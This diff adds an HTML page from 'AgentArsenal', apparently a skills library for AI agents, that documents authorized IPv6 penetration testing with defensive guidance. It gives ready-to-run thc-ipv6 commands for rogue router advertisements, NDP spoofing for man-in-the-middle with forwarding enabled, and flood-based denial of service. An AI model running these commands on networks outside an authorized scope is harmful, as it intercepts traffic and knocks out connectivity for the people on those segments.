@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: ipv6-attacks</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>ipv6-attacks</h2><div class="meta"><span class="badge gray">network</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">95/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when testing IPv6 on authorized engagements, especially</p><div class="deps"><span class="kind">requires:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="nmap-methodology.html">nmap-methodology</a> <a href="recon-active.html">recon-active</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>thc-ipv6</td><td>3.8</td></tr><tr><td>nmap</td><td>7.98</td></tr><tr><td>Wireshark</td><td>4.4</td></tr></tbody></table><p>Most networks are dual-stack today: IPv6 runs alongside IPv4, often with less monitoring, weaker firewall rules, and no IDS coverage. Attackers know this. IPv6 autoconfiguration (SLAAC) trusts router advertisements from anyone on the link, which enables rogue router and NDP spoofing attacks straight out of the thc-ipv6 toolkit. This skill covers authorized IPv6 assessment: discovering v6 hosts, understanding NDP and SLAAC, running rogue RA and neighbor spoofing attacks in a lab or scoped segment, and auditing whether defenses cover IPv6 at all. The denial of service demos are lab only. All testing targets systems you have written permission to test.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Check whether the test segment and your attack box have IPv6 enabled.</li>
+<li>Discover live IPv6 hosts with multicast ping and alive6.</li>
+<li>Map the NDP and SLAAC behavior: who advertises routers, what prefixes</li>
+<p>are announced.</p>
+<li>Run a rogue router advertisement to prove SLAAC trust (scoped, brief).</li>
+<li>Demonstrate NDP spoofing for MITM positioning with parasite6.</li>
+<li>Audit firewall, IDS, and logging for IPv6 blind spots.</li>
+<li>Restore normal router advertisements and verify recovery.</li>
+</ol>
+<h2>1. Confirm IPv6 is alive on the segment</h2>
+<p>Many testers assume IPv4 only and miss the whole v6 surface. Check both your box and the wire.</p>
+<pre><code class="language-bash"># Your IPv6 addresses (link-local fe80:: and any global addresses)
+ip -6 addr show dev eth0 | grep inet6
+
+# Is there a router advertising on the link? Listen briefly
+sudo timeout 20 tshark -i eth0 -Y icmpv6.type==134 -T fields \
+  -e ipv6.src -e icmpv6.nd.ra.prefix 2&gt;/dev/null | head -10
+# icmpv6 type 134 = Router Advertisement; the prefix line shows the network</code></pre>
+<pre><code class="language-bash"># Multicast ping to all nodes: every IPv6 host should answer
+ping6 -c2 -I eth0 ff02::1 | head -20
+
+# thc-ipv6 discovery: enumerate live hosts properly
+sudo alive6 eth0 | tee /tmp/alive6.txt</code></pre>
+<p><code>alive6</code> finds hosts that ignore multicast ping. Save its output; those addresses are your target list for scanning.</p>
+<pre><code class="language-bash"># nmap IPv6 host discovery and port scan on found hosts
+sudo nmap -6 -sn --send-ip ff02::1 -e eth0 2&gt;/dev/null | grep -E &#x27;Nmap scan|MAC&#x27;
+sudo nmap -6 -F -T4 2001:db8::10 -oN /tmp/v6-ports.txt</code></pre>
+<p>Note: nmap needs <code>-6</code> for everything IPv6, and link-local addresses need the interface suffix (<code>fe80::1%eth0</code>).</p>
+<h2>2. Understand NDP and SLAAC on the target</h2>
+<p>IPv6 replaced ARP with NDP (Neighbor Discovery Protocol) and DHCP with SLAAC (Stateless Address Autoconfiguration) plus optional DHCPv6. The trust problem: hosts accept Router Advertisements from any link-local sender.</p>
+<pre><code class="language-bash"># Capture RAs and Router Solicitations for two minutes
+sudo timeout 120 tshark -i eth0 -Y &quot;icmpv6.type==133 or icmpv6.type==134&quot; \
+  -w /tmp/ndp.pcap
+tshark -r /tmp/ndp.pcap -T fields -e ipv6.src -e icmpv6.nd.ra.prefix \
+  -e icmpv6.nd.ra.lifetime | sort -u
+
+# Watch neighbor solicitation/advertisement pairs (the v6 ARP)
+sudo timeout 60 tshark -i eth0 -Y &quot;icmpv6.type==135 or icmpv6.type==136&quot; \
+  -T fields -e ipv6.src -e icmpv6.nd.ns.target_address 2&gt;/dev/null | head -20</code></pre>
+<p>Record: the legitimate router&#x27;s link-local address, the advertised prefix, the RA lifetime, and the managed/other-config flags (M and O flags tell hosts whether to use DHCPv6).</p>
+<h2>3. Rogue router advertisement (fake_router6)</h2>
+<p>A rogue RA tells victims you are a router, so they add you as a default gateway and send traffic your way. This is the IPv6 equivalent of ARP spoofing plus DHCP spoofing in one packet. Run it briefly and only in scope.</p>
+<pre><code class="language-bash"># Announce yourself as a router for the observed prefix (example values)
+sudo fake_router6 eth0 2001:db8:1::/64
+
+# With a limited lifetime so victims recover fast when you stop
+# (fake_router6 uses a default lifetime; keep the run under 2 minutes)
+timeout 90 sudo fake_router6 eth0 2001:db8:1::/64</code></pre>
+<p>While it runs, verify from a lab victim that its default route changed:</p>
+<pre><code class="language-bash"># On the victim (lab): the attacker&#x27;s link-local should appear as gateway
+ip -6 route show default</code></pre>
+<p>Then prove traffic interception the same way as IPv4 MITM: enable forwarding (<code>net.ipv6.conf.all.forwarding=1</code>), capture, and look for cleartext protocols. Stop the tool with Ctrl-C; victims fall back to the real router when your RAs expire.</p>
+<pre><code class="language-bash"># Enable IPv6 forwarding before intercepting
+echo 1 | sudo tee /proc/sys/net/ipv6/conf/all/forwarding</code></pre>
+<h2>4. NDP spoofing with parasite6</h2>
+<p><code>parasite6</code> answers neighbor solicitations for a target address, placing you in the middle for specific hosts without touching router config. It is quieter than a rogue RA.</p>
+<pre><code class="language-bash"># Spoof the gateway for one victim (lab or explicitly scoped)
+sudo parasite6 -l eth0 2001:db8:1::1 2001:db8:1::50
+# Args: interface, address to impersonate, victim to poison (omit victim for all)</code></pre>
+<p>Monitor with tshark filtered on neighbor advertisements from your MAC to confirm the poison, then capture victim traffic as in the rogue RA case. Restore by stopping parasite6; NDP entries expire and correct themselves, but verify the victim&#x27;s neighbor table recovers.</p>
+<h2>5. Denial of service demos (lab only)</h2>
+<p>Malformed RAs can break IPv6 on a segment. These are disruptive; run them only in an isolated lab, never on a client network.</p>
+<pre><code class="language-bash"># Flood bogus router advertisements (lab only)
+sudo flood_router6 eth0
+
+# Flood neighbor advertisements to exhaust neighbor caches (lab only)
+sudo flood_advertise6 eth0</code></pre>
+<p>The finding for a client report is not the flood itself but the absence of RA guard on the switch: with RA guard, the switch drops RAs from untrusted ports and these attacks fail. Test for RA guard presence in the lab, report the control gap on the client network.</p>
+<h2>6. Audit the IPv6 blind spot</h2>
+<p>The highest value IPv6 work on most engagements is not exploitation but showing the defenders they cannot see v6 at all.</p>
+<pre><code class="language-bash"># Does the firewall treat v6 like v4? Compare open ports both ways
+sudo nmap -F -T4 192.0.2.10 -oG /tmp/v4.gnmap &gt;/dev/null
+sudo nmap -6 -F -T4 2001:db8::10 -oG /tmp/v6.gnmap &gt;/dev/null
+grep open /tmp/v4.gnmap | head; echo ---; grep open /tmp/v6.gnmap | head
+
+# Check ip6tables / nftables for v6 rules on a host you administer
+sudo ip6tables -L -n | head -20
+sudo nft list ruleset 2&gt;/dev/null | grep -i &quot;ip6\|inet&quot; | head -20
+
+# Is anything logging v6? Look for v6 in firewall and IDS logs
+sudo grep -i &quot;2001:\|fe80:&quot; /var/log/ufw.log 2&gt;/dev/null | head -5</code></pre>
+<p>Common gaps: no ip6tables rules at all, IDS without v6 decoders, SIEM parsers that drop v6 addresses, and VPNs that tunnel v4 but leak v6 around the tunnel. Each gap is a finding with the exact command that exposed it.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>The segment has no IPv6. <code>ip -6 addr</code> shows only link-local and no RAs</li>
+<p>arrive; there is nothing to attack, but note whether v6 is disabled by policy or just absent.</p>
+<li>The switch enforces RA guard. Rogue RAs die at the port; verify the</li>
+<p>control works and report it as effective.</p>
+<li>SEND (Secure Neighbor Discovery) is deployed. Cryptographically signed</li>
+<p>NDP defeats spoofing; this is rare outside high security networks, and finding it is a positive note.</p>
+<li>Targets use privacy extensions (temporary addresses). Host tracking by</li>
+<p>address gets harder; correlate by MAC-derived interface identifiers or DHCPv6 DUIDs instead.</p>
+<li>thc-ipv6 tools need raw sockets. Run as root, and on some distros</li>
+<p>install the package as <code>thc-ipv6</code> (Debian/Ubuntu) rather than building from source.</p>
+<li>nmap IPv6 scans are slow. Use <code>-F</code> or a targeted port list first; full</li>
+<p>v6 port sweeps across large ranges take far longer than v4.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>Rogue RA is blocked by RA guard. Note the control, then check whether</li>
+<p>the guard covers all switch ports or only user ports; misconfigured trunk ports are the usual hole.</p>
+<li>You need v6 MITM but RA is guarded. Fall back to parasite6 NDP</li>
+<p>spoofing against specific victims, which RA guard does not stop.</p>
+<li>The client has no IPv6 at all. Recommend they keep it that way</li>
+<p>deliberately (disable via sysctl and GPO) rather than by accident, so it does not silently appear later.</p>
+<li>DHCPv6 is in use (M flag set). Test DHCPv6 spoofing only in the lab;</li>
+<p>on client networks, note the M flag and recommend DHCPv6 guard or snooping.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see IPv6 attacks as unexpected ICMPv6 type 134 from non-router ports, neighbor advertisement storms, and new default gateways appearing on hosts. Switches with RA guard and DHCPv6 snooping drop the attack traffic outright; NDR tools with v6 decoders flag the anomalies. The durable fixes: enable RA guard on all access ports, deploy SEND where the risk justifies it, write and test ip6tables/nftables rules with the same care as v4 rules, make sure the IDS and SIEM parse IPv6, and decide explicitly whether IPv6 is on or off everywhere instead of letting it drift. Audit for v6 the same way you audit v4, on a schedule.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1557 (Adversary-in-the-Middle): rogue RA and NDP</li>
+<p>spoofing.</p>
+<li>MITRE ATT&amp;CK T1046 (Network Service Discovery): alive6 and v6 scans.</li>
+<li>CWE-306 (Missing Authentication for Critical Function): unauthenticated</li>
+<p>router advertisements.</p>
+<li>IETF RFC 4861 (Neighbor Discovery), RFC 4862 (SLAAC), RFC 6104 (Rogue</li>
+<p>RA problem statement).</p>
+<li>thc-ipv6 toolkit: https://github.com/vanhauser-thc/thc-ipv6</li>
+<li>nmap IPv6 scanning: https://nmap.org/book/man.html (section on -6)</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
